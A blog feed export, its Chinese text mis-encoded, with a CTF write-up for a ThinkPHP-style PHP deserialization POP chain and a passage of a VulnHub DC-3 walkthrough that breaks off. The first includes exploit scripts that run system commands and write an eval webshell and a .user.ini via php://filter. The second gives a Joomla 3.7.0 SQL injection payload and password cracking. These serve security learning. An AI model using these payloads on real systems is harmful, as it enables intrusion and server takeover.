      <title>buuctfæ–°æ˜¥çº¢åŒ…é¢˜writeup</title>
      <link href="2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/"/>
      <url>2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/</url>
      
        <content type="html"><![CDATA[<p>è®°ä¸€ä¸‹é¢˜ç›®çš„writeupï¼Œæ”¶è·å¾ˆå¤šï¼å¤ªèœäº†ï¼Œé‚£éº½å¤šæ–¹æ³•ä¸€ä¸ªä¸ä¼šï¼ğŸ˜­</p><a id="more"></a><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>é¢˜ç›®åŸå‹ä¸ºthinkphp 6.0ååºåˆ—åŒ–ï¼Œæ”¹è‡ªäº2019é«˜æ ¡è¿ç»´èµ›ezpop,å¢åŠ äº†ç‚¹éš¾åº¦</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$store, $key = <span class="string">&#x27;flysystem&#x27;</span>, $expire = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> $contents</span>) </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span>(<span class="params">$expire</span>): <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) $expire;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span>(<span class="params"><span class="keyword">string</span> $name</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="comment">// ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span></span><br><span class="line">        $cache_filename = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;prefix&#x27;</span>] . uniqid() . $name;</span><br><span class="line">        <span class="keyword">if</span>(substr($cache_filename, -strlen(<span class="string">&#x27;.php&#x27;</span>)) === <span class="string">&#x27;.php&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $cache_filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params">$data</span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">string</span>) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">$name, $value, $expire = <span class="literal">null</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// åˆ›å»ºå¤±è´¥</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//æ•°æ®å‹ç¼©</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="string">&#x27;%012d&#x27;</span>, $expire) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> $filename;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;src&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="string">&quot;uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">&quot;data&quot;</span>]);</span><br></pre></td></tr></table></figure><p>å…ˆä»‹ç»å‡ ä¸ªæ¦‚å¿µï¼ŒPOPï¼Œå…¨ç§°é¢å‘å±æ€§ç¼–ç¨‹ï¼ˆ<code>Property-Oriented Programing</code>ï¼Œå¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆ<code>Return-Oriented Programing</code>ï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾ã€‚POP é“¾çš„æ„é€ å°±æ˜¯å¯»æ‰¾ç¨‹åºå½“å‰ç¯å¢ƒä¸­å·²ç»å®šä¹‰äº†æˆ–è€…èƒ½å¤ŸåŠ¨æ€åŠ è½½çš„å¯¹è±¡ä¸­çš„å±æ€§ï¼ˆå‡½æ•°æ–¹æ³•ï¼‰ï¼Œå°†ä¸€äº›å¯èƒ½çš„è°ƒç”¨ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå®Œæ•´çš„ã€å…·æœ‰ç›®çš„æ€§çš„æ“ä½œã€‚</p><p>POPé“¾ï¼š<code>A::__destruct()</code>=&gt;<code>A::save()</code>=&gt;<code>A::store-&gt;set()</code>==<code>b::set()</code>æœ€åè§¦å‘<code>$result = file_put_contents($filename, $data);</code></p><p>åˆ†æä¸€ä¸‹ï¼š</p><p>ååºåˆ—åŒ–æ“ä½œä¼šæ‰§è¡Œ<code>__destruct()</code>æ–¹æ³•ï¼ŒBç±»æ²¡æœ‰è¯¥æ–¹æ³•ï¼Œè€ŒAç±»ä¸­æœ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬è·Ÿè¿›Aç±»çš„<code>__destruct()</code>æ–¹æ³•ï¼Œå‘ç°<code>$this-&gt;autosave</code>ä¸ºç©ºæˆ–è€…0æˆ–falseæ—¶æ‰§è¡Œ<code>$this-&gt;save()</code>æ–¹æ³•</p><ul><li>è·Ÿè¿›ç¬¬ä¸€è¡Œä»£ç å‘ç°æ‰§è¡Œ<code>$this-&gt;getForStorage()</code>ï¼Œå‡½æ•°é‡Œåˆæ‰§è¡Œäº†<code>$this-&gt;cleanContents()</code>ï¼Œä¼ å‚ä¸ºæ•°ç»„ï¼Œå†è·Ÿè¿›ï¼Œé¦–å…ˆè¿›è¡Œäº†åè½¬é”®å€¼çš„æ“ä½œï¼Œéå†ä¼ è¿‡æ¥çš„æ•°ç»„å‚æ•°ï¼Œå¦‚æœè¯¥æ•°ç»„çš„å€¼ä»ä¸ºæ•°ç»„ï¼Œå–ä¸åè½¬é”®å€¼åæ–°æ•°ç»„é”®åçš„äº¤é›†å­˜åœ¨<code>$contents</code>æ•°ç»„é‡Œï¼Œé”®ä¸º<code>$contents</code>çš„é”®ï¼Œç„¶åå°†<code>$this-&gt;complete</code>å’Œå®Œæˆä¸Šé¢æ“ä½œçš„æ–°æ•°ç»„jsonç¼–ç è¿”å›</li><li>è·Ÿè¿›ç¬¬äºŒè¡Œä»£ç ï¼Œå‘ç°æ‰§è¡Œäº†æŸä¸ªå¯¹è±¡çš„setæ–¹æ³•ï¼Œä¼ äº†ä¸‰ä¸ªå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥å°†å¯¹è±¡è®¾ä¸ºBï¼Œè·Ÿè¿›ï¼Œé¦–å…ˆåˆ¤æ–­<code>$expire</code>æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™å–<code>$this-&gt;options[&#39;expire&#39;]</code>ï¼Œç„¶åè°ƒç”¨äº†<code>$this-&gt;getExpireTime()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†ä¼ çš„å‚æ•°å¼ºåˆ¶intè½¬æ¢ï¼Œç„¶åè°ƒç”¨äº†<code>$this-&gt;getCacheKey()</code>æ–¹æ³•ï¼Œç”Ÿæˆä¸€ä¸ª<code>$this-&gt;options[&#39;prefix&#39;]</code>ï¼Œå¾®ç§’çº§æ—¶é—´æˆ³å’Œä¼ è¿‡æ¥å‚æ•°æ‹¼æ¥æˆçš„æ–‡ä»¶åï¼Œå¹¶ä¸”ä¼ è¿‡æ¥çš„å‚æ•°ä¸èƒ½æ˜¯<code>.php</code>,ç„¶åæ²¡æœ‰åˆ™åˆ›å»ºæ–‡ä»¶å¤¹ï¼Œè‹¥ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ•°å­—ï¼Œå°±è¿”å›stringç±»å‹è½¬æ¢çš„ç»“æœï¼Œå¦åˆ™è¿”å›<code>$this-&gt;options[&#39;serialize&#39;]($data)</code>ï¼Œå‹ç¼©æ•°æ®ï¼Œæœ€åä¸€ä¸ªæ­»äº¡é€€å‡ºï¼Œæ‹¼æ¥åºåˆ—åŒ–çš„ç»“æœå†™å…¥æ‹¼æ¥æˆçš„æ–‡ä»¶å†…</li></ul><p>å¤§æ¦‚æ€è·¯å·²ç»æ¸…æ™°ï¼Œbypassä¸€äº›é™åˆ¶ï¼š</p><ol><li>æ–‡ä»¶åé‚£é‡Œå¯ä»¥ç”¨<code>.php/.</code>è€Œç»•è¿‡</li><li>æ­»äº¡é€€å‡ºé‚£ä¸ªåœ°æ–¹å¯ä»¥ç”¨ä¼ªåè®®<code>php://filter/write=convert.base64-decode/resource</code>è¿›è¡Œbase64è§£ç å†™å…¥ï¼Œå¯å°†shellå…ˆbase64ç¼–ç ï¼Œæ³¨æ„è¦å…ˆæŠŠå‰åŠéƒ¨åˆ†è¡¥é½å»æ‰<code>&lt;?;&gt;()</code>è¿™äº›æ— æ³•è¢«base64çš„å­—ç¬¦ï¼Œ<code>php//exit</code>ä¸€å…±9ä¸ªå­—ç¬¦ï¼Œå†åŠ ä¸Š12ä¸ª0ï¼Œå…±21ä¸ªï¼Œbase64ç¼–ç 4ä¸ªä¸€ç»„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å†åŠ 3ä¸ª</li></ol><p>ä»¥ä¸Šæ˜¯ezpopçš„æ€è·¯ï¼Œé¢˜ç›®çš„å˜é‡ä¾¿æ˜¯æ–‡ä»¶åä¸å¯æ§ï¼Œæœ‰ä¸‰ç§æ€è·¯ï¼š</p><h3 id="æ–¹å¼1-system"><a href="#æ–¹å¼1-system" class="headerlink" title="æ–¹å¼1(system)"></a>æ–¹å¼1(system)</h3><p>å‚è§å®‰å…¨å®¢æ–‡ç« :<a href="https://www.anquanke.com/post/id/194036">https://www.anquanke.com/post/id/194036</a></p><p>exp:(ç±»åŠ ä¸Šå°±è¡Œ)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$testB = <span class="keyword">new</span> B();</span><br><span class="line">$testB-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">$testA = <span class="keyword">new</span> A($testB, <span class="string">&quot;miao&quot;</span>);</span><br><span class="line">$testA-&gt;autosave = <span class="number">0</span>;</span><br><span class="line">$testA-&gt;cache = [<span class="string">&#x27;aaq&#x27;</span> =&gt; <span class="string">&#x27;`cat /flag &gt; ./flag.xml`&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($testA)).<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆautosaveè¦ä¸º0ï¼Œ<code>$testB-&gt;options[&#39;serialize&#39;]</code>è¦ä¸ºsystemå‡½æ•°ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯¹æœ€åçš„å†™æ–‡ä»¶æ²¡ä»€è«è¦æ±‚äº†ï¼Œä½†å¿…é¡»è¦æ‰§è¡Œåˆ°<code>$data = $this-&gt;serialize($value);</code>è¿™æ­¥ï¼Œ<code>$testA-&gt;cache</code>è¦ä¸ºsystemè¦æ‰§è¡Œçš„å‘½ä»¤</p><h3 id="æ–¹å¼2-ç»•è¿‡"><a href="#æ–¹å¼2-ç»•è¿‡" class="headerlink" title="æ–¹å¼2(/../ç»•è¿‡)"></a>æ–¹å¼2(/../ç»•è¿‡)</h3><p>å…¶å®å¯ä»¥ç›´æ¥è¿™æ ·ç»•è¿‡ï¼Œæ—¶é—´æˆ³å°†ä¼šè¢«è®¤ä¸ºä¸€ä¸ªç›®å½•ï¼Œexp(åŠ ä¸Šç±»)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../a.php/.&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;s&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><img src="/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/TIMæˆªå›¾20200210231552.png" style="zoom: 67%;"><h3 id="æ–¹å¼3-user-ini"><a href="#æ–¹å¼3-user-ini" class="headerlink" title="æ–¹å¼3(.user.ini)"></a>æ–¹å¼3(.user.ini)</h3><p>å…¶å®è¿™ä¸ªä¹Ÿæ˜¯ä¸Šé¢çš„æ€è·¯ï¼Œä¸»è¦è¿˜æ˜¯è·¨ç›®å½•çš„ç¼˜æ•…ï¼Œå¦‚æœ<code>.php</code>ä¸çŸ¥é“æ€æœ«ç»•å¯ä»¥ç”¨è¿™ç§æ€è·¯ï¼Œexp(åŠ ä¸Šç±»):</p><p><strong>ä¸Šä¼ å›¾ç‰‡ï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../aaaaaa.jpg&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&#x27;&lt;?php @eval($_POST[&quot;moyu&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p><strong>ä¸Šä¼ <code>.user.ini</code>:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$b-&gt;writeTimes = <span class="number">0</span>;</span><br><span class="line">$b -&gt; options = <span class="keyword">array</span>(<span class="string">&#x27;serialize&#x27;</span> =&gt; <span class="string">&quot;base64_decode&quot;</span>, </span><br><span class="line">                      <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">                      <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&quot;php://filter/write=convert.base64-decode/resource=uploads/moyu&quot;</span>);</span><br><span class="line">$a = <span class="keyword">new</span> A($store = $b, $key = <span class="string">&quot;/../../.user.ini&quot;</span>, $expire = <span class="number">0</span>);</span><br><span class="line">$a-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line">$a-&gt;cache = <span class="keyword">array</span>();</span><br><span class="line">$a-&gt;complete = base64_encode(<span class="string">&#x27;qaq&#x27;</span>.base64_encode(<span class="string">&quot;\nauto_prepend_file=aaaaaa.jpg&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><img src="/2020/02/10/buuctf%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%98writeup/TIMæˆªå›¾20200210233351.png" style="zoom:67%;"><p>å‚è€ƒï¼š</p><p><a href="https://www.zhaoj.in/read-6397.html">https://www.zhaoj.in/read-6397.html</a></p><p><a href="http://althims.com/2020/01/29/buu-new-year/">http://althims.com/2020/01/29/buu-new-year/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> pop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulnHubä¹‹DC-3é¶æœº</title>
      <link href="2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/"/>
      <url>2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†ç©DC-3é¶æœºçš„è¿‡ç¨‹ï¼</p><a id="more"></a><p>kaliï¼š192.168.17.146</p><p>é¶æœºï¼š192.168.17.137</p><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>æ‰“å¼€æ˜¯è¿™æ ·çš„</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206155435.png" style="zoom:80%;"><p>è‹±è¯­ç¿»è¯‘ä¸€ä¸‹çš„å¤§æ¦‚æ„æ€å°±æ˜¯åªæœ‰ä¸€ä¸ªflagï¼Œå¹¶ä¸”åªæœ‰è·å¾—rootæ‰èƒ½è·å¾—flag</p><p>dirsearchæ‰«ä¸€ä¸‹ï¼Œåœ¨<code>README.txt</code>çœ‹åˆ°æ˜¯<code>Joomla3.7</code></p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206165809.png" style="zoom:80%;"><p>æœäº†æœï¼Œå‘ç°<code>Joomla3.7.0</code>æœ‰sqlæ³¨å…¥æ¼æ´ï¼Œpayload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?option&#x3D;com_fields&amp;view&#x3D;fields&amp;layout&#x3D;modal&amp;list[fullordering]&#x3D;updatexml(1,concat(0x3e,database()),0)</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨sqlmapè·‘</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206170944.png" style="zoom:80%;"><p>è·‘å‡ºæ¥è´¦å·å¯†ç </p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206172206.png" style="zoom:80%;"><p>æ˜¾ç„¶è¿™ä¸ªå¯†ç æ˜¯ç»è¿‡æŸç§åŠ å¯†çš„ï¼Œç”¨<code>john</code>è§£å¯†ï¼Œå…ˆå°†åŠ å¯†çš„å­—ç¬¦ä¸²å†™åˆ°hashè¿™ä¸ªæ–‡ä»¶å†…</p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206173133.png" style="zoom:80%;"><p>è§£å‡ºæ¥æ˜¯<code>snoopy</code>ï¼Œç™»é™†åå°ï¼Œåœ°å€ï¼š<code>/administrator/index.php</code></p><img src="/2020/02/06/VulnHub%E4%B9%8BDC-3%E9%9D%B6%E6%9C%BA/TIMæˆªå›¾20200206174707.png" 